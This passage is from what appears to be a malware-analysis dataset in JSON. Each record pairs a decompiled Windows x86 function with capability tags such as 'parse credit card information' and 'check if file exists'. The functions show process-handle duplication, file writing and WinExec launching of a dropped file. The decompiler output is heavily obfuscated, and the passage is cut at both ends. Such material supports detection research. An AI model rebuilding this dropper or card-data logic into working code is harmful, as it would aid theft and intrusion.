0xc3;\n    *(iVar3 + 7) = *(iVar3 + 7) >> (iVar3 & 0x1f);\n    puVar4 = &var_1fh;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_80h + 1;\n    var_60h._0_1_ = var_80h;\n    var_20h = var_80h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_60h + 1;\n    var_40h._0_1_ = var_80h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar2 = fcn.00401510(&var_80h, &var_60h, &var_20h, &var_40h);\n    bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return false;\n    }\n    if ((bVar5) && (!bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00401240();\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00404e10(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 937
    },
    "004018e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401933) overlaps instruction at (ram,0x0040192f)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040191f)\n\nuint __cdecl fcn.004018e0(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ulong uVar8;\n    uint var_4h;\n    \n    iVar3 = fcn.00404a60(0x4112e0);\n    if (iVar3 == -1) {\n        return 0;\n    }\n    *unaff_EDI = *unaff_ESI;\n    *(iVar3 + -4) = 0;\n    *(iVar3 + -8) = 0x40;\n    pcVar2 = _sym.imp.KERNEL32.dll_OpenProcess;\n    puVar5 = iVar3 + -0xc;\n    *(iVar3 + -0xc) = 0x40193e;\n    uVar8 = (*pcVar2)();\n    *0x50e181cc = uVar8;\n    if (*0x50e181cc != 0) {\n        *(puVar5 + -4) = *0x50e181cc;\n        *(puVar5 + -8) = extraout_ECX;\n        *(puVar5 + -0xc) = uVar8 >> 0x20;\n        *(puVar5 + -0x10) = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n        *(puVar5 + -0x14) = puVar5;\n        *(puVar5 + -0x18) = 0x50e181d0;\n        *(puVar5 + -0x1c) = unaff_ESI + 1;\n        *(puVar5 + -0x20) = unaff_EDI + 1;\n        uVar1 = *(*(puVar5 + -0x18) + -4);\n        uVar4 = *(*(puVar5 + -0x18) + 8);\n        *(puVar5 + -4) = 2;\n        *(puVar5 + -8) = 0;\n        *(puVar5 + -0xc) = 0;\n        *(puVar5 + -0x10) = 0;\n        *(puVar5 + -0x14) = uVar1;\n        *(puVar5 + -0x18) = uVar4;\n        pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n        puVar6 = puVar5 + -0x1c;\n        *(puVar5 + -0x1c) = 0x401970;\n        uVar4 = (*pcVar2)();\n        *(puVar6 + -4) = uVar4;\n        pcVar2 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n        puVar7 = puVar6 + -8;\n        *(puVar6 + -8) = 0x401977;\n        iVar3 = (*pcVar2)();\n        if (iVar3 != 0) {\n            *(puVar7 + -4) = iVar3;\n            *(puVar7 + -4) = uVar1;\n            pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n            *(puVar7 + -8) = 0x401994;\n            (*pcVar2)();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 837
    },
    "004019a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    ushort in_DX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uchar *unaff_ESI;\n    bool in_ZF;\n    bool bVar6;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    *0x423724 = fcn.00401ad0();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        bVar6 = iVar2 == 0;\n        if (!bVar6) {\n            puVar5 = &stack0xfffffffc;\n            if ((!bVar6) && (puVar5 = &stack0xfffffffc,  bVar6)) {\n                puVar3 = &stack0xffffffb8;\n                puVar5 = &stack0xffffffb8;\n                cVar1 = '\\x10';\n                do {\n                    puVar4 = puVar4 + -1;\n                    puVar3 = puVar3 + -1;\n                    *puVar3 = *puVar4;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n            }\n            if (*0x423724 != 0) {\n                iVar2 = fcn.004018e0(arg_8h_00);\n                *0x423724 = iVar2 == 0;\n            }\n            fcn.00404900(0, arg_8h_00);\n            if ((*0x10 != 0x44) && (*0x10 == 0x44)) {\n                puVar4 = 0xfffffffc;\n                cVar1 = '\\x10';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar5;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n            }\n            if (*0x423724 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 573
    },
    "004042d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.004042d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x10 != 0x110 && 0x10b < &stack0xfffffffc) &&\n       (*0x10 == 0x110 || SBORROW4(&stack0xfffffffc, 0x10c) != &var_10ch < 0)) {\n        if (in_ECX == 0) {\n            *(unaff_EBX + -0x74a4a13a) = *(unaff_EBX + -0x74a4a13a);\n            iVar1 = in(0x5d);\n            return iVar1;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004033d0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.004033d0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.004033d0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.004033d0(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.00404280();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.004041d0(0x80000001, 0x4114bc, 0x4114e8, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        iVar1 = arg_20h;\n    }\n    return iVar1;\n}\n",
        "token_count": 744
    },
    "00404a60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x423718)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x42371c)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404b36:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00404b36;\n        }\n        iVar2 = (**0x423720)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 344
    },
    "00404e10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00405061) overlaps instruction at (ram,0x00405060)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuchar * __cdecl fcn.00404e10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    char extraout_CH;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t unaff_EBX;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uint uVar11;\n    uchar *puVar12;\n    uint uVar13;\n    uint8_t uVar14;\n    bool bVar15;\n    uchar uVar16;\n    char cVar17;\n    char cVar18;\n    uint64_t uVar19;\n    uint64_t uVar20;\n    int32_t iStackY588;\n    uint uStackY584;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &fcn.00404e10::var_213h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    s = 0;\n    puVar10 = &fcn.00404e10::var_10fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    var_ch = 1;\n    *(puVar10 + 2) = 0;\n    uVar14 = 0;\n    uVar16 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puVar2 = (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar16) || (!uVar16)) {\n        puVar2 = &fcn.00404e10::var_8h;\n    }\n    uStackY584 = 0x404ebd;\n    fcn.00402160(&fcn.00404e10::var_4h, puVar2 + uVar14 + 0xf8458d2f);\n    uStackY584 = 0x404ee5;\n    iVar4 = fcn.00404bc0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return NULL;\n    }\n    iVar4 = fcn.004019a0(&stack0xfffffeec, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return NULL;\n    }\n    if ((iVar4 < 0) || (iVar4 >= 0)) {\n        iStackY588 = puVar10 + 3;\n        uStackY584 = arg_8h;\n    }\n    uVar5 = &stack0xfffffdb4 ^ *(unaff_EBX + 0x60);\n    cVar18 = SBORROW1(extraout_CH + -1, '\\x05');\n    cVar17 = extraout_CH + -6 < '\\0';\n    bVar15 = extraout_CH + -1 == '\\x05';\n    puVar10 = *(uVar5 + 8);\n    piVar6 = uVar5 + 0x20;\n    *(uVar5 + 0x1c) = 0x404f59;\n    fcn.004016c0();\n    if ((bVar15 || cVar18 != cVar17) || (!bVar15 && cVar18 == cVar17)) {\n        piVar6 = uVar5 + 0x1c;\n        *(uVar5 + 0x1c) = 0x4112cc;\n    }\n    piVar6[-1] = 0x404f71;\n    iVar4 = fcn.00404a60(*piVar6);\n    if (iVar4 == -1) {\n        *piVar6 = 0x4112c0;\n        piVar6[-1] = 0x404f8a;\n        uVar19 = fcn.00404a60(*piVar6);\n        if (uVar19 != -1) {\n            uVar11 = 0xf;\n            goto code_r0x00404f97;\n        }\n        uVar13 = puVar10[2];\n    }\n    else {\n        uVar11 = 0xe;\ncode_r0x00404f97:\n        uVar13 = puVar10[2];\n        *piVar6 = puVar10[3];\n        piVar6[-1] = uVar13;\n        piVar6[-2] = 0x404fa4;\n        uVar20 = fcn.00403750(piVar6[-1]);\n        uVar19 = uVar20 & 0xffffffff00000000 | *0x423724;\n        if (uVar20 != 0) {\n            *piVar6 = uVar11;\n            piVar6[-1] = 0x404fb1;\n            fcn.00402510();\n            piVar6[-1] = uVar11;\n            piVar6[-2] = 0x404fb7;\n            fcn.004041c0();\n            return 0x1;\n        }\n        if (*0x423724 == 0) {\n            return NULL;\n        }\n    }\n    piVar8 = piVar6 + 1;\n    *piVar6 = uVar19 >> 0x20;\n    *(piVar6 + -2) = uVar19;\n    *piVar6 = puVar10 + -0x44;\n    piVar6[-1] = uVar13;\n    piVar6[-2] = 0x405002;\n    iVar4 = fcn.00401dc0(piVar6[-1], *piVar6);\n    if (iVar4 != 0) {\n        puVar12 = puVar10[-3];\n        if (iVar4 == 0) {\n            piVar8 = piVar6 + 2;\n        }\n    }\n    else {\n        puVar12 = NULL;\n        piVar8 = piVar6 + 1;\n    }\n    uVar11 = extraout_ECX;\n    if (puVar12 != NULL) {\n        *(piVar8 + -4) = uVar13;\n        *(piVar8 + -8) = 0x40502b;\n        puVar3 = fcn.00404b50(*(piVar8 + -4));\n        uVar11 = extraout_ECX_00;\n        if (puVar3 == NULL) {\n            puVar10[-3] = 0;\n            puVar12 = puVar3;\n        }\n    }\n    *(piVar8 + -4) = uVar11;\n    uVar11 = *(piVar8 + -4);\n    puVar3 = puVar12;\n    if (puVar12 == NULL) {\n        *(piVar8 + -4) = 0;\n        *(piVar8 + -8) = uVar13;\n        *(piVar8 + -0xc) = 0x40504d;\n        puVar12 = fcn.00404460(*(piVar8 + -8), *(piVar8 + -4));\n        puVar10[-3] = puVar12;\n        uVar11 = extraout_ECX_01;\n        puVar3 = piVar8;\n    }\n    bVar15 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if ((bVar15) || (*(piVar8 + -4) = uVar11,  !bVar15)) {\n        bVar15 = puVar12 == NULL;\n        if (bVar15) goto code_r0x0040506f;\n        puVar7 = piVar8 + -4;\n        piVar8 = piVar8 + -4;\n        *puVar7 = 0xffffffff;\n    }\n    *(puVar10 + 0x6a0a74f6) = *(puVar10 + 0x6a0a74f6) + -1;\n    *(piVar8 + -4) = 0x40506c;\n    fcn.004041c0();\n    bVar15 = piVar8 == 0xfffffffc;\n    piVar8 = piVar8 + 4;\ncode_r0x0040506f:\n    if ((!bVar15) && (bVar15)) {\n        puVar2 = piVar8 + -4;\n        *(piVar8 + -4) = puVar10;\n        cVar17 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar2 = puVar2 + -1;\n            *puVar2 = *puVar10;\n            cVar17 = cVar17 + -1;\n        } while ('\\0' < cVar17);\n        *(piVar8 + -0x48) = piVar8 + -4;\n        piVar8 = piVar8 + -0x5e63;\n    }\n    *(piVar8 + -4) = 1000;\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar9 = piVar8 + -8;\n    *(piVar8 + -8) = 0x405089;\n    (*pcVar1)();\n    *(puVar9 + -4) = 0;\n    *(puVar9 + -8) = 0x4112e0;\n    pcVar1 = _sym.imp.KERNEL32.dll_WinExec;\n    *(puVar9 + -0xc) = 0x4050ad;\n    (*pcVar1)();\n    return puVar12;\n}\n",
        "token_count": 2292
    },
    "00402090": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020ac) overlaps instruction at (ram,0x004020aa)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __cdecl fcn.00402090(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint16_t *in_EDX;\n    uint32_t unaff_EBX;\n    uint16_t **ppuVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint unaff_EDI;\n    char in_SF;\n    char in_OF;\n    uint var_4h;\n    \n    if (in_OF == in_SF) {\n        if (in_OF != in_SF) goto code_r0x004020a9;\n    }\n    unaff_EBX = arg_8h;\ncode_r0x004020a9:\n    ppuVar3 = &stack0xffffffe4 ^ *(unaff_EBX - 0x75);\n    iVar4 = *ppuVar3;\n    *(in_ECX + 0x56) = *(in_ECX + 0x56) | in_EDX;\n    uVar5 = ppuVar3[1];\n    *(iVar4 + 0xc) = *(iVar4 + 0xc);\n    if (*(iVar4 + 0x10) != 0) {\n        *(iVar4 + 0x10) = *(iVar4 + 0x10);\n        do {\n            ppuVar3[2] = in_EDX;\n            ppuVar3[1] = unaff_EDI;\n            unaff_EDI = ppuVar3[1];\n            in_EDX = *(iVar4 + 0xc);\n            uVar1 = *in_EDX;\n            unaff_EBX = unaff_EBX + uVar1;\n            *(iVar4 + 8) = unaff_EBX;\n            *(iVar4 + -4) = unaff_EBX >> 0x10;\n            if (unaff_EBX >> 0x10 != 0) {\n                ppuVar3[2] = unaff_EBX >> 0x10;\n                ppuVar3[1] = uVar1;\n                *ppuVar3 = in_EDX;\n                ppuVar3[-1] = unaff_EBX;\n                ppuVar3[-2] = ppuVar3 + 3;\n                ppuVar3[-3] = iVar4;\n                ppuVar3[-4] = uVar5;\n                ppuVar3[-5] = unaff_EDI;\n                unaff_EDI = ppuVar3[-5];\n                uVar5 = ppuVar3[-4];\n                iVar4 = ppuVar3[-3];\n                in_EDX = *ppuVar3;\n                unaff_EBX = (*(iVar4 + -4) & 0xffff) + (*(iVar4 + 8) & 0xffff);\n                *(iVar4 + 8) = unaff_EBX;\n            }\n            iVar2 = *(iVar4 + 0x10) + -1;\n            *(iVar4 + 0xc) = *(iVar4 + 0xc) + 2;\n            *(iVar4 + 0x10) = iVar2;\n        } while (iVar2 != 0);\n    }\n    return (unaff_EBX >> 0x10) + unaff_EBX;\n}\n",
        "token_count": 761
    },
    "004021f0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402240) overlaps instruction at (ram,0x0040223f)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402315)\n\nulong __cdecl fcn.004021f0(uchar *arg_8h, uint arg_ch)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    int32_t *in_EAX;\n    int32_t *piVar7;\n    uint uVar8;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int32_t iVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    unkbyte10 in_ST0;\n    uint auStack28 [2];\n    uint16_t uStack18;\n    uint uStack4;\n    \n    while( true ) {\n        puVar11 = &uStack4;\n        *arg_8h = 0x68;\n        arg_8h[1] = 0xf8;\n        uStack18 = in_ECX;\n        arg_8h[2] = 0xa4;\n        uVar5 = in_EDX & 0xffff;\n        uVar1 = ((CONCAT11((in_EAX >> 8) + -0x2b, in_EAX) ^ 0x3d) + 0x7c28 ^\n                CONCAT11((in_EDX & 0xffff) >> 8 | uVar5, uVar5)) + 0xbfff;\n        bVar16 = uVar1 == 0;\n        bVar15 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n        arg_8h[3] = 0x7a;\n        if ((bVar15) || (!bVar15)) {\n            arg_8h[4] = 0x99;\n            piVar7 = in_EAX;\n            puVar13 = arg_8h;\n        }\n        else {\n            puVar11 = *0xc617b43a;\n            uVar5 = in_EDX + 1U + 0x99;\n            bVar16 = uVar5 == 0;\n            piVar7 = in_EDX + 1U & 0xffffff00 | uVar5;\n            in_EDX = in_EAX;\n            puVar13 = 0x34a96cf5;\n        }\n        puVar12 = puVar13;\n        if ((!bVar16) && (bVar16)) {\n            piVar7 = piVar7 & 0xffffff00 | *0x4bb148d3;\n            puVar12 = puVar13 + 1;\n            out(*puVar13, in_EDX);\n        }\n        puVar12[5] = 0xc5;\n        uVar5 = unaff_EBX;\n        piVar4 = in_ECX & 0xffff0000 | uStack18 & 0xff | ((in_ECX << 0x10) >> 0x18) - uVar5 << 8;\n        iVar14 = puVar11[2];\n        *(iVar14 + 6) = 0x57;\n        if ((in_EDX < piVar4) && (piVar4 <= in_EDX)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(iVar14 + 7) = 0x4b;\n        if ((piVar4 <= in_EDX) || (in_EDX < piVar4)) break;\n        in_AF = 9 < (piVar7 & 0xf) | in_AF;\n        in_EAX = piVar7 & 0xffff0000 | CONCAT11((piVar7 >> 8) + in_AF, piVar7 + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(in_EAX * 2) = *(in_EAX * 2) - (unaff_EBX >> 8);\n    }\n    *(iVar14 + 8) = 0xa3;\n    bVar15 = unaff_EBX + 1 < 0;\n    *(iVar14 + 9) = 0x72;\n    if ((SCARRY4(unaff_EBX, 1) != bVar15) || (in_ECX = in_ECX & 0xffff,  SCARRY4(unaff_EBX, 1) == bVar15)) {\n        uStack18 = in_ECX;\n        *(iVar14 + 10) = 0x34;\n    }\n    *(piVar7 + -0x1f3a4905) = in_ST0;\n    uVar6 = piVar7 - 1U;\n    uVar2 = 9 < (uVar6 & 0xf) | in_AF;\n    uVar6 = uVar6 + uVar2 * '\\x06';\n    *in_EDX = *in_EDX + 0x47c6df84;\n    uVar9 = in_EDX & 0xffff0000 |\n            CONCAT11(in_EDX >> 8 |\n                     *((piVar7 - 1U & 0xffffff00 |\n                       uVar6 + (0x90 < (uVar6 & 0xf0) | piVar4 < in_EDX | uVar2 * (0xf9 < uVar6)) * '`') + in_EDX * 2), \n                     in_EDX);\n    bVar16 = unaff_EBX + 1 < 0;\n    bVar15 = unaff_EBX == 0xffffffff;\n    *(iVar14 + 0xb) = 0x52;\n    if ((bVar15 || SCARRY4(unaff_EBX, 1) != bVar16) || (!bVar15 && SCARRY4(unaff_EBX, 1) == bVar16)) {\n        *(iVar14 + 0xc) = 0xf8;\n    }\n    else {\n        unaff_EBX = unaff_EBX | 0xf8;\n        bVar15 = (uVar5 | 0xf8) == 0;\n    }\n    *(iVar14 + 0xd) = 0x76;\n    if ((!bVar15) && (bVar15)) {\n        unaff_EBX = unaff_EBX & 0xe2f4cc58;\n    }\n    *(iVar14 + 0xe) = 0x5b;\n    bVar15 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n    *(iVar14 + 0xf) = 0x7a;\n    if ((bVar15) || (!bVar15)) {\n        *(iVar14 + 0x10) = 0xe5;\n    }\n    else {\n        puVar11 = *0xc617b43a;\n        iVar14 = iVar14 + 1;\n        uStack18 = uStack18 & 0xff | (uStack18 >> 8) + (uVar9 + 1 >> 8) << 8;\n        uVar9 = unaff_EBX;\n    }\n    *(iVar14 + 0x11) = 0xba;\n    bVar15 = (uVar9 - 1U & uStack18) != 0;\n    puVar12 = puVar11[2];\n    puVar12[0x12] = 0xad;\n    puVar13 = puVar12;\n    if ((bVar15) && (!bVar15)) {\n        puVar13 = puVar12 + 1;\n        out(*puVar12, uVar9);\n    }\n    puVar13[0x13] = 0x75;\n    bVar15 = (POPCOUNT(uStack18 + 1 & 0xc9) & 1U) != 0;\n    puVar13[0x14] = 0x6b;\n    if ((bVar15) && (!bVar15)) {\n        puVar10 = auStack28 + 1;\n        cVar3 = '\\x1e';\n        do {\n            puVar11 = puVar11 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar11;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        uVar8 = in(0x78);\n        return CONCAT44(uVar9, uVar8);\n    }\n    puVar13[0x15] = 0x10;\n    puVar13[0x16] = 0x3b;\n    puVar13[0x17] = 0x5a;\n    puVar11 = puVar11[3];\n    *puVar11 = 0x18;\n    return CONCAT44(uVar9, puVar11);\n}\n",
        "token_count": 2042
    },
    "null": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00403110": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040324b) overlaps instruction at (ram,0x00403247)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403110(void)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint *puVar3;\n    uint16_t uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    ushort extraout_CX_01;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    char *unaff_EBX;\n    uchar *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint uVar12;\n    ushort in_SS;\n    bool bVar13;\n    uchar uVar14;\n    uchar uVar15;\n    bool bVar16;\n    uchar uVar17;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    uint uStack84;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    char *pcStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uint uStack28;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uStack16 = 0x20;\n    uStack14 = 0;\n    uStack20 = 0x15f0;\n    uStack18 = 0x41;\n    uStack24 = 0x11;\n    uStack22 = 0;\n    uStack28 = 0x4236f4;\n    iStack32 = 0x403133;\n    fcn.00401bf0();\n    bVar13 = false;\n    uStack16 = 0x26;\n    uStack14 = 0;\n    uStack20 = 0x1610;\n    uStack18 = 0x41;\n    uStack24 = 0x11;\n    uStack22 = 0;\n    uStack28 = 0x4236f4;\n    iStack32 = 0x40315f;\n    uVar20 = fcn.00401bf0();\n    iVar6 = uVar20 >> 0x20;\n    if (bVar13) {\ncode_r0x00403178:\n        iStack32 = 8;\n        uStack36 = 0x411638;\n        pcStack40 = 0x11;\n    }\n    else {\n        iStack32 = iVar6;\n        if (!bVar13) goto code_r0x00403178;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    puVar1 = uVar20 + (bVar13 == false) + 0x7c8ecb45;\n    *puVar1 = *puVar1 | extraout_ECX >> 8;\n    uStack44 = CONCAT22(uStack44._2_2_, in_SS);\n    pcVar2 = iVar6 + 0x11;\n    *pcVar2 = *pcVar2 + (extraout_ECX + 1 >> 8);\n    uStack48 = 0x4236f4;\n    uStack52 = 0x40318b;\n    fcn.00401bf0();\n    uStack20 = 0x19;\n    uStack18 = 0;\n    uStack24 = 0x1640;\n    uStack22 = 0x41;\n    uStack28 = 0x11;\n    iStack32 = 0x4236f4;\n    uStack36 = 0x4031a8;\n    uVar4 = fcn.00401bf0();\n    uVar14 = 0;\n    uVar4 = (uVar4 & 0xff | ((uVar4 >> 8) - unaff_EBX) + 0x4d << 8) & 0x26ae;\n    cVar19 = SBORROW2(uVar4, 1);\n    uVar4 = uVar4 - 1;\n    cVar18 = uVar4 < 0;\n    uVar17 = 